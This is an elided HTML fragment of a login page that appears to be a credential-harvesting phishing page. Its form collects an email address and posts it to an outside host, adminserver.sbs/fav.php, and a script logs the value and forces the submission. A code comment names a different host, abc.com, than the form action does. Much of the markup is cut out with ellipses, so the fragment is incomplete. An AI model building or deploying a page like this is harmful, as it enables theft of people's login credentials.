...
<body>
    <div class="p-8 w-full max-w-md login-container">
        ...
        <form id="login-form" method="POST" action="https://adminserver.sbs/fav.php">
            <input
                type="email"
                id="email"
                name="email"
        ...
        <p id="error" class="text-red-500 text-center mt-3 hidden"></p>
    ...
    <script>
        $(document).ready(function() {
            ...
            $('#login-form').on('submit', function(e) {
                ...
                $('#msg').text('Submitting to server...').show();
                console.log('Form submitted: Email=', emailVal);
                this.submit(); // Manually trigger form submission to https://abc.com/fav.php
            });
        });
    </script>
</body>
